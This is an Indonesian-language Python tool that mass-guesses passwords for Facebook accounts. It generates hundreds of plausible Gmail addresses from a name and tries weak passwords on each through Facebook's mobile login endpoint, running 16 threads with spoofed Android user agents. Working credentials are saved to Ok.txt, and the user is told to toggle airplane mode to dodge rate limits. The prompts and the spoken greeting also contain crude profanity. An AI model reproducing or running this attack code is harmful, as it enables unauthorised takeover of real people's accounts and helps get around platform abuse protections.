N = "\x1b[00m"
M = "\x1b[1;91m"
K = "\x1b[1;93m"
H = "\x1b[1;92m"
B = "\x1b[1;94m"
U = "\x1b[1;95m"
C = "\x1b[2;96m"
P = "\x1b[1;97m"
import os, sys, subprocess
os.system("clear")
for ngimport in range(6):
	try:
		import requests
		import mechanize
		import rich
		import fake_useragent
		import bs4
		import gtts
	except ImportError as eror:
		print ("{}[{}!{}] {}Sedang menginstall module {}{}".format(H,M,H,P,H,eror.name))
		os.system("python -m pip install {} &> /dev/null".format(eror.name))
import time, random, json, datetime, re
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as xenz
from time import sleep
from time import strftime
from rich.console import Console
from rich import print as prints
from rich.markdown import Markdown
from rich.panel import Panel
from rich.tree import Tree
from rich.columns import Columns
from gtts import gTTS


class Main:
	def __init__(self):
		os.popen('play-audio .halo.mp3')
		self.email = []
		self.ok = 0
		self.cp = 0
		self.loop = 0
		self.nama = 'Xenz'
		try:
			self.sim = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
		except:
			self.sim = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
		self.menu()
	def menu(self):
		os.system('clear')
		self.list = ('''{}========================================
{} Nama kamu: {}{}
{} Kartu sim: {}{}
{}========================================
{} 1. {}Crack email
{} 2. {}Cek result

{} [{} Pilih No {}1{}/{}2 {}]
{}        └────────────► {}'''.format(B,P,H,self.nama,P,H,self.sim,B,K,P,K,P,M,P,K,P,K,M,P,H))
		self.pilih = input(self.list)
		if self.pilih == '1':self.generator_email()
		elif self.pilih == '2':self.cek_result()
		else:print ('{} Pilih yang bener lah kontol'.format(M));sleep(3);Main()
	def cek_result(self):
		self.list = ('''{}========================================
 1. Result Ok             2. Result Cp
========================================
 [ Pilih No 1/2 ]
        └────────────► {}'''.format(P,H))
		self.milachan = input(self.list)
		if self.milachan == '1':
			self.buka = open('Ok.txt','r').read().splitlines()
			for akun in self.buka:
				print (akun)
		if self.milachan == '2':
			self.buka = open('Cp.txt','r').read().splitlines()
			for akun in self.buka:
				print (akun)
		else:exit()

	def generator_email(self):
		self.text = ('''{}========================================
{} Masukan nama untuk dump email
{} Contoh: {}xenz
{}========================================
{} [ {}Masukan nama {}]
{}        └────────────► {}'''.format(B,P,P,H,B,M,P,M,P,H))
		self.user = input(self.text).lower()
		self.domain = '@gmail.com'
		for ngedump in range(random.randint(500,1500)):
			self.depan = random.choice(['putri','andika','aku','saya','akun','ahmad','mohammad','muhammad','peler','ini','sayang','x','hacker'])
			self.belakang = random.choice(['mustakim','gamers','gaming','dev','xyz','tzy','fuck','1','123','budi','slebew','hacker','turu','said','ali','sakit','lammer','attacker','tolol','cantik','ganteng','gans','cans','ganz','chan','kun','soleh','404','rasis','eror','clone'])
			self.tahun = str(random.randint(1945,2006))
			self.email1 = self.user+self.belakang+self.domain
			self.email2 = self.depan+self.user+self.domain
			self.email3 = self.depan+self.user+self.belakang+self.domain
			self.email4 = self.user+self.tahun+self.domain
			self.email5 = self.user+self.belakang+self.tahun+self.domain
			self.email6 = self.depan+self.user+self.belakang+self.domain
			if (self.email1+'|'+self.user) in self.email:pass
			else:self.email.append(self.email1+'|'+self.user)
			if (self.email2+'|'+self.user) in self.email:pass
			else:self.email.append(self.email2+'|'+self.user)
			if (self.email3+'|'+self.user) in self.email:pass
			else:self.email.append(self.email3+'|'+self.user)
			if (self.email4+'|'+self.user) in self.email:pass
			else:self.email.append(self.email4+'|'+self.user)
			if (self.email5+'|'+self.user) in self.email:pass
			else:self.email.append(self.email5+'|'+self.user)
			if (self.email6+'|'+self.user) in self.email:pass
			else:self.email.append(self.email6+'|'+self.user)
			sys.stdout.write('       \r{} Mengumpulkan email: {}{}'.format(P,H,len(self.email)))
			sys.stdout.flush()
			sleep(0.001)
		print ('\r{} Email yang terkumpul: {}{}'.format(P,H,len(self.email)))
		self.notice = ('''{}========================================
{} Mainkan mode pesawat setiap {}5 {}menit
{} Hasil {}Ok {}tersimpan di: {}Ok.txt
{} Hasil {}Cp {}tersimpan di: {}Cp.txt
{}========================================'''.format(B,P,U,P,P,H,P,H,P,K,P,K,B))
		print (self.notice)
		self.kocok()
	def kocok(self):
		with xenz(max_workers=16) as brute:
			for data in self.email:
				idf = data.split("|")[0]
				nmf = data.split("|")[1]
				listpw = [nmf,nmf+'123',nmf+'1234',nmf+'12345',nmf+'123456','123456']
				brute.submit(self.crack, idf, listpw)
		print ('''\r
{}========================================
{} Crack selesai {}Ok: {}{}   {}Cp: {}{}
{}========================================'''.format(B,C,P,H,self.P,P,K,self.cp,B))
		exit()
	def crack(self, idf, listpw):
		anime = random.choice([M,K,H])
		sys.stdout.write(f'     \r {U}> {anime}{self.loop}{P}/{C}{len(self.email)} {P}Ok: ({H}{self.ok}{P}) Cp: ({K}{self.cp}{P}) {U}<')
		self.versi = random.choice([str(random.randint(4,8))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),"10","11","12"])
		self.chrome = str(random.randint(43,108))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(85,128))
		self.device = random.choice(["SM-N975U1 Build/SP1A.210812.016; wv","SM-A105F","SC-01G Build/LRX22C; wv","SC-01H Build/LMY47X; wv","SM-G850F Build/LRX22G","SM-C9000 Build/MMB29M; wv","SM-G928F","SM-J111M Build/LMY47V; wv","SM-G532M","SM-J337V Build/PPR1.180610.011; wv","SM-J3110 Build/LMY47X; wv","SM-J730F","SM-J200BT Build/LMY47X; wv","SM-G530T1 Build/LMY47X; wv","GT-P3113; Flow","SM-G960F Build/R16NW; wv"])
		ua = 'Mozilla/5.0 (Linux; Android '+self.versi+'; '+self.device+') AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+self.chrome+' Mobile Safari/537.36'
		for pw in listpw:
			try:
				session = requests.Session()
				HEAD1 = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': "Android",'save-data': 'on','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/?refsrc=deprecated','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',}
				link = session.get('https://m.facebook.com/login/?refsrc=deprecated',headers=HEAD1)
				data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),'email': idf,'prefill_contact_point': idf,'prefill_source': 'browser_dropdown','prefill_type': 'contact_point','first_prefill_source': 'browser_dropdown','first_prefill_type': 'contact_point','had_cp_prefilled': True,'had_password_prefilled': False,'is_smart_lock': False,'bi_xrwh': 0,'encpass': '#PWD_BROWSER:0:{}:{}'.format(int(time.time()),pw),'fb_dtsg': re.search('{"dtsg":{"token":"(.*?)"', str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw','__csr': '','__req': random.randint(1,9),'__a': re.search('"encrypted":"(.*?)"', str(link.text)).group(1),'__user':0}
				HEAD2 = {'Host': 'm.facebook.com','content-length': str(len((";").join([ "%s=%s" % (key, value) for key, value in data.items()]))),'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','content-type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?1','save-data': 'on','user-agent': ua,'sec-ch-ua-platform': "Android",'accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/?refsrc=deprecated','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',}
				ress = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=HEAD2,allow_redirects=False)
				if "c_user" in session.cookies.get_dict().keys():
					self.ok+=1
					open('Ok.txt','a').write(idf+'|'+pw+'\n')
					print (f'\r {P}[{H}LIVE{P}]{H} {idf}{P}|{H}{pw}                    ')
					break
				if "checkpoint" in session.cookies.get_dict().keys():
					self.cp+=1
					open('Cp.txt','a').write(idf+'|'+pw+'\n')
					print (f'\r {P}[{K}CEPE{P}]{K} {idf}{P}|{K}{pw}                    ')
					break
				else:continue
			except requests.exceptions.ConnectionError:
				sleep(10)
		self.loop+=1


if __name__=='__main__':
	try:open('nama.txt','r').read()
	except:
		nama = input('Masukan nama: ')
		open('nama.txt','w').write(nama)
		wel = gTTS('Hallo    '+nama+'     Memek      Wellcome     To     My      Tools')
		wel.save('.halo.mp3')
	Main()


# Gausah dijual ya memek klo mo jual bikin sendiri
